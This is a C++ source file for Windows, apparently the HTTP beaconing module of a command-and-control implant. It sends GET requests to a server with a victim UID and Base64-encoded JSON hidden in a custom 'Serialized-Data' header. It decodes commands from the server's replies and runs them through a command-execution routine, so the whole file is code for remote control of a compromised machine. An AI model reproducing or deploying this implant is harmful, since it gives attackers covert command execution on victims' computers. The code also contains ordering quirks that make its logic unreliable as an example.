#include <iostream>
#include <string>
#include <sstream>
#include <ws2tcpip.h>
#include "xhttp.h"
#include <winsock2.h>
#include <map>
#include <cstring>
#include <cstdint>
#include <stdint.h>
#include <algorithm>
#include "command.h"
#include <vector>
#include <zlib/zlib.h>
#include <nlohmann/json.hpp>
#include "misc.h"
#include "base64.hpp"

#pragma comment(lib, "ws2_32.lib")

namespace xhttp {
std::vector<uint32_t> req_body;
std::string cmdstr;
std::string cmdString;
std::string cmdGroup;
std::string cmdValue;
std::string queryParams;
std::string encodedParams;
CommandQueue queue;
int key;
std::string cmdResponse;
cmdStruct msg;
using namespace std;

bool parse_url(const std::string& url, std::string& protocol, std::string& host, int& port, std::string& path) {
    std::stringstream ss(url);
    std::string temp;

    // Parse protocol
    getline(ss, protocol, ':');
    if (protocol != "http") {
        std::cerr << "Invalid protocol. Only 'http' protocol is supported." << std::endl;
        return false;
    }
    // Check if there are more characters in the stringstream
    if (ss.peek() == EOF) {
        std::cerr << "Unexpected end of URL." << std::endl;
        return false;
    }
    // Consume "//"
    getline(ss, temp, '/');
    getline(ss, temp, '/');

    // Parse host and port
    getline(ss, host, ':');
    if (host.empty()) {
        std::cerr << "Invalid URL format. Hostname is missing." << std::endl;
        return false;
    }
    std::string port_str;
    getline(ss, port_str, '/');
    if (port_str.empty()) {
        std::cerr << "Invalid URL format. Port number is missing." << std::endl;
        return false;
    }
    port = stoi(port_str);
    // Parse path
    getline(ss, path);
    if (path.empty()) {
        std::cerr << "Invalid URL format. Path is missing." << std::endl;
        return false;
    }
    return true;
}

std::string createCookiesString() {
    // Define the cookies string with dynamic ID
    std::string cookies = "ID=value1; cookie2=value2"; // separate cookies with semicolon

    return cookies;
}


// Serialize Queue object to JSON
void to_json(json& j, const Queue& q) {
    j = json{{"Group", q.Group}, {"String", q.String}, {"Response", q.Response}};
}

std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
    if (!queue.empty()) {
        auto it = queue.begin(); 

        // Accessing the first element using the iterator
        int key = it->first;
        Queue& queueElement = it->second;
        std::string cmdGroup = queueElement.Group;
        std::string cmdString = queueElement.String;
        std::string cmdResponse = queueElement.Response;

        // Create Message structure
        cmdStruct msg;
        msg.Group = cmdGroup;
        msg.String = cmdString;
        msg.Response = cmdResponse;

        // Convert Message structure to JSON
        json j;
        j["Group"] = msg.Group;
        j["String"] = msg.String;
        j["Response"] = msg.Response;

        string jsonStr = j.dump();

        // Base64 encode
        std::string baseJ = macaron::Base64::Encode(jsonStr);

        // Build the GET request string
        std::string cookiesString = createCookiesString(); 
        std::string getRequest = "GET /" + path + " HTTP/1.1\r\n"
                                + "Host: " + host + "\r\n"
                                + "Connection: Keep-Alive\r\n"
                                + "Keep-Alive: timeout=15, max=1000\r\n" 
                                + "Cookies: " + cookiesString + "\r\n"
                                + "Serialized-Data: " + baseJ + "\r\n"
                                + "UID: " + misc::uid + "\r\n"
                                + "\r\n";
        removeFromQueue(queue);
        return getRequest;
    
    } else {
        // Queue is empty, return request without command information;
        std::string cookiesString = createCookiesString(); 
        std::string getRequest = "GET /" + path + " HTTP/1.1\r\n"
                                + "Host: " + host + "\r\n"
                                + "Connection: Keep-Alive\r\n"
                                + "Keep-Alive: timeout=15, max=1000\r\n" 
                                + "Cookies: " + cookiesString + "\r\n"
                                + "UID: " + misc::uid + "\r\n"
                                + "\r\n";
        return getRequest;
    }
}

bool initialize_winsock() {
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2, 2), &wsaData) == 0;
}

SOCKET create_socket(const std::string& host, int port) {
    SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
        return INVALID_SOCKET;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(host.c_str());
    serverAddr.sin_port = htons(port);

    if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        return INVALID_SOCKET;
    }

    return ConnectSocket;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////                                       GET  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

std::string http_get(const std::string& url) {
    std::string protocol, host, path, cookies;
    int port;
    if (!parse_url(url, protocol, host, port, path)) {
        return "";
    }

    if (!initialize_winsock()) {
        return "";
    }

    SOCKET ConnectSocket = create_socket(host, port);
    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return "";
    }

    std::string request = buildRequest(path, host, cookies, queue);

    if (send(ConnectSocket, request.c_str(), request.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Error sending request: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return "";
    }

    std::vector<char> response_data = receive_data(ConnectSocket);
    std::string cmdValue = extractCMD(response_data);
    req_body.clear();

    closesocket(ConnectSocket);
    WSACleanup();
    return ""; 
}

std::string extractCMD(const std::vector<char>& data) {
    std::string dataStr(data.begin(), data.end());
    std::istringstream ss(dataStr);
    std::string line;
    std::string base64_str;

    while (std::getline(ss, line)) {
        if (line.find("Serialized-Data:") != std::string::npos) {
            size_t pos = line.find("Serialized-Data:");
            if (pos != std::string::npos) {
                pos += strlen("Serialized-Data:"); 
                base64_str = line.substr(pos); // Extract the substring after "Serialized-Data:"
                break; // Exit the loop since we found what we needed
            }
        }
    }
    base64_str.erase(std::remove_if(base64_str.begin(), base64_str.end(), ::isspace), base64_str.end());
    if (!base64_str.empty()) {
        try {
            std::string out;
            std::string decoded_data = macaron::Base64::Decode(base64_str, out);
            // Parse JSON response
            json jsonResponse = json::parse(out);

            // Extract and use value to declare a variable
            cmdGroup = jsonResponse["Group"];
            cmdString = jsonResponse["String"];
 
        } catch (const std::invalid_argument& e) {
            std::cerr << "Error decoding base64: " << e.what() << std::endl;
            // Handle error
        }
    }
    return "";
}


void addToQueue(CommandQueue& queue, int key, const std::string& cmdGroup, const std::string& cmdString, const std::string& cmdResponse) {
    queue[key] = Queue{cmdGroup, cmdString, cmdResponse};  // Add command to the queue with the specified key
}

void removeFromQueue(CommandQueue& queue) {
    if (!queue.empty()) {
        queue.erase(queue.begin()); // Erase the first element
    }
}

bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
    // Search for the Content-Length header
    const std::string content_length_header = "Content-Length:";
    auto header_start = std::search(data.begin(), data.end(), content_length_header.begin(), content_length_header.end());
    if (header_start != data.end()) {
        // Find the end of the header line
        auto header_end = std::find(header_start, data.end(), '\n');
        if (header_end != data.end()) {
            // Extract the content length value
            std::string length_str(header_start + content_length_header.size(), header_end);
            content_length = std::stoul(length_str);
            return true;
        }
    }
    return false;
}

std::vector<char> receive_data(SOCKET ConnectSocket) {
    constexpr size_t BUFFER_SIZE = 2048;
    std::vector<char> buffer;
    int totalBytesReceived = 0;
    int bytesReceived;

    size_t content_length = 0;
    bool found_content_length = false;

    do {
        char chunkBuffer[BUFFER_SIZE];
        bytesReceived = recv(ConnectSocket, chunkBuffer, BUFFER_SIZE, 0);
        if (bytesReceived > 0) {
            buffer.insert(buffer.end(), chunkBuffer, chunkBuffer + bytesReceived);
            totalBytesReceived += bytesReceived;

            // Check if we have found the Content-Length header
            if (!found_content_length) {
                // Convert buffer to string to search for Content-Length
                std::string str(buffer.begin(), buffer.end());
                found_content_length = extract_content_length(buffer, content_length);
            }

            // Check if we have received the entire body
            if (found_content_length && totalBytesReceived >= content_length) {
                break;
            }
        } else if (bytesReceived == 0) {
            // Connection closed by the server
            break;
        } else {
            std::cerr << "recv failed\n";
            closesocket(ConnectSocket);
            WSACleanup();
            return std::vector<char>();
        }
    } while (bytesReceived == BUFFER_SIZE);

    if (cmdString.length() >= 1) {
        addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
        wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
    }
    cmdGroup.clear();
    cmdString.clear();
    cmdResponse.clear();

    msg.Group.clear();
    msg.String.clear();
    msg.Response.clear();

    json j;
    j["Group"] = msg.Group;
    j["String"] = msg.String;
    j["Response"] = msg.Response;

    return buffer;
}



}